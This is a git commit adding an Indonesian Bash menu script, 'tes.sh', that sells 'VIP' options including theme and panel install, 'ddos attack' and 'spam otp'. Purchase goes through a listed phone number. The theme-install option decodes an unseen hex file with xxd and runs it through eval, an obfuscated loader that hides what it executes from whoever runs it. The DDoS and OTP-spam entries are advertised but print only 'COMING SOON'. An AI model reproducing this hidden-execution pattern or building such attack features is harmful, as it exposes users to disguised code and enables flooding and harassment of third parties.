d2c99d58634eb27c120fd77dba798e22abe498da
Amar110703 <utolu5484@gmail.com>
2024-08-19 17:36:50 +0700

    Add files via upload

---
+++ tes.sh
@@ -0,0 +1,68 @@
+#!/bin/bash
+
+# Definisi warna
+BIRU='\033[0;34m'       
+MERAH='\033[0;31m'
+HIJAU='\033[0;32m'
+KUNING='\033[0;33m'
+NC='\033[0m'
+
+echo -e "SILAHKAN ISI NAMA ANDA"
+read NAMA
+
+display_welcome() {
+  echo -e "${BIRU}-----------------------------------------------------${NC}"
+  echo -e "${KUNING}NAME : $NAMA${NC}"
+  echo -e "${KUNING}STATUS : ONLINE${NC}"
+  echo -e "${BIRU}-----------------------------------------------------${NC}"
+  echo -e "${KUNING}PAKAILAH SESUKA ANDA${NC}"
+  echo -e "${KUNING}NOTE : PEMBELIAN TOKEN BISA LANGSUNG PM${NC}"
+  echo -e "${KUNING}-----------------------------------------------${NC}"
+  echo -e "${KUNING}NO : 085960349812${NC}"
+  echo -e "${KUNING}CREADIT : MARZ OFFC${NC}"
+  clear
+}
+
+select_display() {
+  while true; do
+  echo -e "${HIJAU}----------------------------------------------${NC}"
+  echo -e "${KUNING}silahkan pilih salah satu dari menu di bawah ini${NC}"
+  echo -e "${HIJAU}----------------------------------------------${NC}"
+  echo -e "1. instal theme (VIP)"
+  echo -e "2. instal panel (VIP)"
+  echo -e "3. ddos attack (VIP)"
+  echo -e "4. spam otp (VIP)"
+  echo -e "x. exit"
+  read -r select
+  case "$select" in
+    1)
+      hex_code=$(cat hex_code.txt)
+      command=$(echo "$hex_code" | xxd -r -p)
+    eval "$command"
+    ;;
+    2)
+      echo -e "${KUNING}COMING SOON${NC}"
+      sleep 3
+      clear
+    ;;
+    3)
+      echo -e "${KUNING}COMING SOON${NC}"
+      sleep 3
+      clear
+    ;;
+    4)
+      echo -e "${KUNING}COMING SOON${NC}"
+      sleep 3
+      clear
+    ;;
+    x)
+      echo -e "${KUNING}exit to script${NC}"
+      exit 0
+    ;;
+    esac
+  done
+}
+
+# display
+display_welcome
+select_display
